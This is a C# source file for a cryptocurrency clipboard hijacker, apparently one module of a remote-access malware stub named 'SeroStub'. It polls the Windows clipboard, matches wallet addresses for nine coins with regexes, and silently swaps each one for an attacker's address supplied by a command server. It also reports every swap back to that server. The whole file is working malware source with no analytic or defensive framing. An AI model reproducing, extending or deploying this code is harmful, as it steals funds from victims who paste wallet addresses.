using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace SeroStub;

internal static class CryptoClipperFeature
{
    // ── Clipboard Win32 API ────────────────────────────────────────────────
    [DllImport("user32.dll")]  private static extern bool OpenClipboard(nint hWnd);
    [DllImport("user32.dll")]  private static extern bool CloseClipboard();
    [DllImport("user32.dll")]  private static extern bool EmptyClipboard();
    [DllImport("user32.dll")]  private static extern nint GetClipboardData(uint uFormat);
    [DllImport("user32.dll")]  private static extern nint SetClipboardData(uint uFormat, nint hMem);
    [DllImport("kernel32.dll")] private static extern nint GlobalAlloc(uint uFlags, nuint dwBytes);
    [DllImport("kernel32.dll")] private static extern nint GlobalLock(nint hMem);
    [DllImport("kernel32.dll")] private static extern bool GlobalUnlock(nint hMem);
    [DllImport("kernel32.dll")] private static extern nuint GlobalSize(nint hMem);
    [DllImport("kernel32.dll")] private static extern nint GlobalFree(nint hMem);

    private const uint CF_UNICODETEXT = 13;
    private const uint GMEM_MOVEABLE  = 0x0002;

    // ── Regex patterns ─────────────────────────────────────────────────────
    // Order matters: more specific prefixes first so broad Base58 patterns
    // (SOL) don't shadow narrower ones (XRP, DASH, TRX).
    private static readonly (string Type, Regex Pattern)[] Patterns =
    [
        // BTC: P2PKH (1…), P2SH (3…), bech32 P2WPKH (bc1q, 42 chars),
        //      bech32 P2WSH / bech32m P2TR (bc1q/bc1p, 62 chars)
        ("BTC",     new Regex(@"^((1|3)[a-zA-Z0-9]{25,33}|bc1[a-z0-9]{6,87})$",  RegexOptions.Compiled)),
        // ETH and BNB share the 0x hex format — indistinguishable by address alone.
        // One row handles both; GetReplacement tries ETH address first, then BNB.
        ("ETH/BNB", new Regex(@"^0x[a-fA-F0-9]{40}$",                            RegexOptions.Compiled)),
        // L... and M... are LTC-only. 3... is identical to BTC P2SH — excluded to avoid false replacement.
        ("LTC",     new Regex(@"^(L|M)[a-zA-Z0-9]{26,33}$",                      RegexOptions.Compiled)),
        ("XMR",     new Regex(@"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$",             RegexOptions.Compiled)),
        // Specific-prefix chains before the generic SOL Base58 pattern
        ("TRX",     new Regex(@"^T[1-9A-HJ-NP-Za-km-z]{33}$",                    RegexOptions.Compiled)),
        ("XRP",     new Regex(@"^r[0-9a-zA-Z]{24,34}$",                           RegexOptions.Compiled)),
        ("DASH",    new Regex(@"^X[1-9A-HJ-NP-Za-km-z]{33}$",                    RegexOptions.Compiled)),
        ("BCH",     new Regex(@"^(bitcoincash:)?(q|p)[a-z0-9]{41}$",              RegexOptions.Compiled)),
        // SOL: ed25519 public key = always exactly 44 Base58 chars.
        // Must come last so the generic Base58 pattern doesn't shadow the chains above.
        ("SOL",     new Regex(@"^[1-9A-HJ-NP-Za-km-z]{44}$",                     RegexOptions.Compiled)),
    ];

    // ── State ──────────────────────────────────────────────────────────────
    private static volatile bool    _enabled;
    private static ClipperConfig    _config    = new();
    private static int              _replaceCount;
    private static volatile string  _lastType  = "";
    private static volatile string  _lastOrig  = "";
    private static volatile string  _lastNew   = "";
    private static string           _lastClip  = "";
    private static Thread?          _thread;
    private static volatile bool    _running;

    // Callback to server when a replacement happens
    internal static Func<string, string, string, Task>? OnDetected; // (type, original, replaced)

    // ── Public API ─────────────────────────────────────────────────────────

    internal static bool IsEnabled => _enabled;
    internal static int  ReplaceCount => Interlocked.CompareExchange(ref _replaceCount, 0, 0);
    internal static (string LastType, string LastOrig, string LastNew) LastHit =>
        (_lastType, _lastOrig, _lastNew);

    internal static void SetConfig(bool enabled, ClipperConfig config)
    {
        _config  = config;
        _enabled = enabled;
        if (enabled && !_running) StartLoop();
        else if (!enabled) StopLoop();
    }

    internal static void StartLoop()
    {
        if (_running) return;
        _running = true;
        _thread = new Thread(Loop) { IsBackground = true, Name = "CC" };
        _thread.Start();
    }

    internal static void StopLoop()
    {
        _running = false;
        _thread?.Join(2000);
        _thread = null;
    }

    // ── Polling loop ───────────────────────────────────────────────────────

    private static void Loop()
    {
        while (_running)
        {
            try
            {
                if (_enabled)
                {
                    string? text = ReadClipboard();
                    if (text != null && text != _lastClip && text.Length >= 20)
                    {
                        _lastClip = text;
                        CheckAndReplace(text);
                    }
                }
            }
            catch { }
            Thread.Sleep(450);
        }
    }

    private static void CheckAndReplace(string text)
    {
        string trimmed = text.Trim();
        foreach (var (type, pattern) in Patterns)
        {
            if (!pattern.IsMatch(trimmed)) continue;
            string? replacement = GetReplacement(type);
            if (string.IsNullOrEmpty(replacement) || replacement == trimmed) return;

            // Replace clipboard
            string newText = text.Replace(trimmed, replacement);
            if (WriteClipboard(newText))
            {
                _lastClip = newText;
                Interlocked.Increment(ref _replaceCount);
                _lastType = type;
                _lastOrig = trimmed.Length > 80 ? trimmed[..80] + "…" : trimmed;
                _lastNew  = replacement;

                // Notify server — run in Task.Run so exceptions are caught and don't kill the clipper thread
                var _t = OnDetected; if (_t != null) _ = Task.Run(async () => { try { await _t(type, _lastOrig, replacement); } catch { } });
            }
            return;
        }
    }

    private static string? GetReplacement(string type) => type switch
    {
        "BTC"     => _config.BTC,
        // ETH and BNB share address format; use ETH address if set, BNB address as fallback.
        "ETH/BNB" => string.IsNullOrEmpty(_config.ETH) ? _config.BNB : _config.ETH,
        "LTC"     => _config.LTC,
        "XMR"     => _config.XMR,
        "SOL"     => _config.SOL,
        "TRX"     => _config.TRX,
        "XRP"     => _config.XRP,
        "DASH"    => _config.DASH,
        "BCH"     => _config.BCH,
        _         => null
    };

    // ── Clipboard helpers ──────────────────────────────────────────────────

    private static string? ReadClipboard()
    {
        if (!OpenClipboard(nint.Zero)) return null;
        try
        {
            nint h = GetClipboardData(CF_UNICODETEXT);
            if (h == nint.Zero) return null;
            nint ptr = GlobalLock(h);
            if (ptr == nint.Zero) return null;
            try
            {
                return Marshal.PtrToStringUni(ptr);
            }
            finally { GlobalUnlock(h); }
        }
        finally { CloseClipboard(); }
    }

    private static bool WriteClipboard(string text)
    {
        if (!OpenClipboard(nint.Zero)) return false;
        try
        {
            EmptyClipboard();
            int byteCount = (text.Length + 1) * 2;
            nint hMem = GlobalAlloc(GMEM_MOVEABLE, (nuint)byteCount);
            if (hMem == nint.Zero) return false;
            nint ptr = GlobalLock(hMem);
            if (ptr == nint.Zero) { GlobalFree(hMem); return false; }
            try { Marshal.Copy(text.ToCharArray(), 0, ptr, text.Length); Marshal.WriteInt16(ptr + text.Length * 2, 0); }
            finally { GlobalUnlock(hMem); }
            SetClipboardData(CF_UNICODETEXT, hMem);
            return true;
        }
        catch { return false; }
        finally { CloseClipboard(); }
    }
}

// ── Config transmitted from server ───────────────────────────────────────────
internal class ClipperConfig
{
    public string BTC  { get; set; } = "";
    public string ETH  { get; set; } = "";
    public string LTC  { get; set; } = "";
    public string XMR  { get; set; } = "";
    public string SOL  { get; set; } = "";
    public string TRX  { get; set; } = "";
    public string XRP  { get; set; } = "";
    public string DASH { get; set; } = "";
    public string BCH  { get; set; } = "";
    public string BNB  { get; set; } = "";
}

internal class ClipperSetConfigStub  { public bool Enabled { get; set; } public ClipperConfig Addresses { get; set; } = new(); }
internal class ClipperDetectedStub   { public string Type { get; set; } = ""; public string Original { get; set; } = ""; public string Replaced { get; set; } = ""; }
internal class ClipperStatsResultStub { public bool Enabled { get; set; } public int Count { get; set; } public string LastType { get; set; } = ""; public string LastOrig { get; set; } = ""; public string LastNew { get; set; } = ""; }
